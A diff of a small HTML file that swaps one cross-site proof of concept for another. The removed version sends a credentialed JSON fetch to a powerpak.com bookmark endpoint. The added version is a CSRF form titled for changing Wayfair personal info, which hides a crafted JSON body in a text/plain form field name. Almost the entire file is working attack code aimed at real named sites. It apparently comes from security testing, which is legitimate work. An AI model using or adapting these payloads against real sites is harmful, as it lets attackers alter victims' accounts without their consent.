@@ -1,28 +1,15 @@
 <!DOCTYPE html>
 <html>
-<body>
-<button onclick="send()">Send JSON request</button>
-<pre id="out"></pre>
+  <body>
+    <h3>CSRF PoC - Change Wayfair Personal Info</h3>
 
-<script>
-async function send() {
-  try {
-    const res = await fetch("https://www.powerpak.com/ws/api.asmx/save_bookmark", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ entity_id: "124041" })
-    });
-
-    document.getElementById("out").textContent =
-      "Status: " + res.status + "\n" + await res.text();
-  } catch (e) {
-    document.getElementById("out").textContent =
-      "Blocked/Error: " + e.message;
-  }
-}
-</script>
-</body>
+    <form action="https://www.wayfair.com/v/account/personal_info/edit?_format=json"
+          method="POST"
+          enctype="text/plain">
+      <input type="hidden"
+             name='{"first_name":"CSRF","last_name":"PoC","submit":true}'
+             value="">
+      <input type="submit" value="Submit CSRF">
+    </form>
+  </body>
 </html>
